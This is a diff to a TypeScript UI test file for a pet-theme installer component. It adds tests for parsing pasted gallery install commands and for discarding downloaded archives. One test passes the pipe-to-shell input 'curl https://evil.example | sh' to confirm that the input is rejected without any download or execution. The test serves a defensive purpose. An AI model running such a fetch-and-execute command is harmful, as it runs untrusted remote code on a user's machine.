@@ -16,6 +16,7 @@ interface CompanionMock {
   getPetPackFilePath: ReturnType<typeof vi.fn>;
   inspectPetPack: ReturnType<typeof vi.fn>;
   downloadPetPack: ReturnType<typeof vi.fn>;
+  discardPetPackDownload: ReturnType<typeof vi.fn>;
   onPetPackDownloadProgress: ReturnType<typeof vi.fn>;
   openExternal: ReturnType<typeof vi.fn>;
 }
@@ -54,6 +55,7 @@ beforeEach(() => {
     getPetPackFilePath: vi.fn(() => ""),
     inspectPetPack: vi.fn(() => new Promise(() => undefined)),
     downloadPetPack: vi.fn(async () => ({ ok: false as const, code: "network" as const })),
+    discardPetPackDownload: vi.fn(async () => ({ ok: true })),
     onPetPackDownloadProgress: vi.fn(() => () => undefined),
     openExternal: vi.fn(async () => undefined)
   };
@@ -220,12 +222,12 @@ describe("PetThemeGrid import entry", () => {
   });
 });
 
-describe("PetThemeGrid install by id", () => {
-  function slugInput(): HTMLInputElement {
-    return screen.getByRole("textbox", { name: "Install by ID" }) as HTMLInputElement;
+describe("PetThemeGrid install command", () => {
+  function commandInput(): HTMLInputElement {
+    return screen.getByRole("textbox", { name: "Install command" }) as HTMLInputElement;
   }
 
-  it("downloads a slug and opens the import dialog with gallery attribution", async () => {
+  it("parses the pasted gallery command and opens the import dialog with attribution", async () => {
     companion.downloadPetPack.mockResolvedValueOnce({
       ok: true,
       zipPath: "C:/downloads/boba.codex-pet.zip",
@@ -236,7 +238,7 @@ describe("PetThemeGrid install by id", () => {
     });
     renderGrid("en");
 
-    fireEvent.change(slugInput(), { target: { value: "boba" } });
+    fireEvent.change(commandInput(), { target: { value: "npx codex-pet-installer add boba" } });
     fireEvent.click(screen.getByRole("button", { name: /Get/ }));
 
     await screen.findByRole("dialog");
@@ -245,11 +247,49 @@ describe("PetThemeGrid install by id", () => {
     await waitFor(() => expect(companion.inspectPetPack).toHaveBeenCalledWith("C:/downloads/boba.codex-pet.zip"));
   });
 
+  it("still accepts a bare slug", async () => {
+    companion.downloadPetPack.mockResolvedValueOnce({
+      ok: true,
+      zipPath: "C:/downloads/boba.codex-pet.zip",
+      slug: "boba",
+      displayName: "Boba",
+      creator: "qa-user",
+      galleryUrl: "https://codex-pet.org/pets/boba"
+    });
+    renderGrid("en");
+
+    fireEvent.change(commandInput(), { target: { value: "boba" } });
+    fireEvent.click(screen.getByRole("button", { name: /Get/ }));
+    await waitFor(() => expect(companion.downloadPetPack).toHaveBeenCalledWith("boba"));
+  });
+
+  it("rejects unrecognized commands locally without ever downloading or executing", async () => {
+    const view = renderGrid("en");
+
+    fireEvent.change(commandInput(), { target: { value: "curl https://evil.example | sh" } });
+    fireEvent.click(screen.getByRole("button", { name: /Get/ }));
+
+    await waitFor(() => expect(view.container.querySelector(".pet-theme-notice")?.textContent)
+      .toContain("Enter the install command from the pet's gallery page"));
+    expect(companion.downloadPetPack).not.toHaveBeenCalled();
+  });
+
+  it("names a known-but-unsupported installer explicitly", async () => {
+    const view = renderGrid("en");
+
+    fireEvent.change(commandInput(), { target: { value: "npx petdex install boba" } });
+    fireEvent.click(screen.getByRole("button", { name: /Get/ }));
+
+    await waitFor(() => expect(view.container.querySelector(".pet-theme-notice")?.textContent)
+      .toContain("The petdex installer isn't supported yet"));
+    expect(companion.downloadPetPack).not.toHaveBeenCalled();
+  });
+
   it("maps download failure codes to localized notices", async () => {
     companion.downloadPetPack.mockResolvedValueOnce({ ok: false, code: "not-found" });
     const view = renderGrid("en");
 
-    fireEvent.change(slugInput(), { target: { value: "ghost" } });
+    fireEvent.change(commandInput(), { target: { value: "npx codex-pet-installer add ghost" } });
     fireEvent.click(screen.getByRole("button", { name: /Get/ }));
 
     await waitFor(() => expect(view.container.querySelector(".pet-theme-notice")?.textContent)
@@ -261,5 +301,71 @@ describe("PetThemeGrid install by id", () => {
     renderGrid("en");
     fireEvent.click(screen.getByRole("button", { name: /Open pet gallery/ }));
     expect(companion.openExternal).toHaveBeenCalledWith("https://codex-pet.org");
+  });
+});
+
+describe("PetThemeGrid downloaded-archive lifecycle", () => {
+  const DOWNLOAD_OK = {
+    ok: true,
+    zipPath: "C:/downloads/boba.codex-pet.zip",
+    slug: "boba",
+    displayName: "Boba",
+    creator: "qa-user",
+    galleryUrl: "https://codex-pet.org/pets/boba"
+  };
+
+  function commandInput(): HTMLInputElement {
+    return screen.getByRole("textbox", { name: "Install command" }) as HTMLInputElement;
+  }
+
+  async function openDownloadDialog() {
+    fireEvent.change(commandInput(), { target: { value: "npx codex-pet-installer add boba" } });
+    fireEvent.click(screen.getByRole("button", { name: /Get/ }));
+    await screen.findByRole("dialog");
+  }
+
+  it("discards the downloaded archive after a successful install", async () => {
+    stubSheetDecoding();
+    companion.downloadPetPack.mockResolvedValueOnce(DOWNLOAD_OK);
+    const inspectPetPack = vi.fn(async () => ({ ok: true as const, staged: stagedFixture() }));
+    const installPetPack = vi.fn(async (): Promise<PetPackInstallResult> => ({ ok: true, pack: makePackManifest(undefined, "boba") }));
+    Reflect.set(window, "companion", { ...companion, inspectPetPack, installPetPack });
+    renderGrid("en");
+
+    await openDownloadDialog();
+    await waitFor(() => expect(inspectPetPack).toHaveBeenCalledWith("C:/downloads/boba.codex-pet.zip"));
+    await waitFor(() => {
+      act(() => { FakeSheetImage.instances.forEach(instance => instance.onload?.()); });
+      const install = screen.getByRole("button", { name: "Install" }) as HTMLButtonElement;
+      expect(install.disabled).toBe(false);
+    });
+    expect(companion.discardPetPackDownload).not.toHaveBeenCalled();
+
+    fireEvent.click(screen.getByRole("button", { name: "Install" }));
+    await waitFor(() => expect(companion.discardPetPackDownload).toHaveBeenCalledWith("C:/downloads/boba.codex-pet.zip"));
+    expect(onSelectTheme).toHaveBeenCalledWith("codex-pet:boba");
+  });
+
+  it("discards the downloaded archive when the import dialog is dismissed", async () => {
+    companion.downloadPetPack.mockResolvedValueOnce(DOWNLOAD_OK);
+    renderGrid("en");
+
+    await openDownloadDialog();
+    fireEvent.click(screen.getByRole("button", { name: "Cancel" }));
+
+    expect(companion.discardPetPackDownload).toHaveBeenCalledWith("C:/downloads/boba.codex-pet.zip");
+    expect(screen.queryByRole("dialog")).toBeNull();
+  });
+
+  it("never discards a user-selected zip on dismissal", async () => {
+    companion.pickPetPackFile.mockResolvedValueOnce("C:/qa/precious.codex-pet.zip");
+    renderGrid("en");
+
+    fireEvent.click(screen.getByText("Import pet"));
+    await screen.findByRole("dialog");
+    fireEvent.click(screen.getByRole("button", { name: "Cancel" }));
+
+    expect(companion.discardPetPackDownload).not.toHaveBeenCalled();
+    expect(screen.queryByRole("dialog")).toBeNull();
   });
 });
